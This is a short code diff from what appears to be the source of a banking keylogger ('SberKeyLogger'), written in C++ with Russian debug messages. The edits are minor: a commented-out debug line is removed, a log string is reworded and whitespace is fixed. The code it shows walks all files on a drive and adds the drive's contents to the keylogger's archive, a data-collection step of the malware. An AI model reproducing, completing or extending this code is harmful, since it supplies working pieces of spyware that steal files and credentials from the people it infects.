@@ -61,8 +61,6 @@ void SberKeyLoggerCalcDriveSize(PCHAR Drive, LPVOID Data, bool &Cancel)
 
 	DWORD Size = 0;
 
-   // pMessageBoxA(0, Drive, NULL, 0);
-
 	SearchFiles(Drive, "*.*", true, FA_ANY_FILES, &Size, SberKeyLoggerSumFileSize);
 
 
@@ -71,9 +69,9 @@ void SberKeyLoggerCalcDriveSize(PCHAR Drive, LPVOID Data, bool &Cancel)
 		PCHAR Dr = STR::New(Drive, 1);
 		PCHAR Name = STR::New(2, "DRIVE_", Dr);
 
-		SBRKDBG("SBER_KEYLOGGER", "Добавляем файлы у устройства в архив в папку %s", Name);
+		SBRKDBG("SBER_KEYLOGGER", "Добавляем файлы устройства в архив в папку %s", Name);
 
-	   	KeyLogger::AddDirectory(Drive, Name);
+		KeyLogger::AddDirectory(Drive, Name);
 
 		STR::Free(Dr);
 		STR::Free(Name);
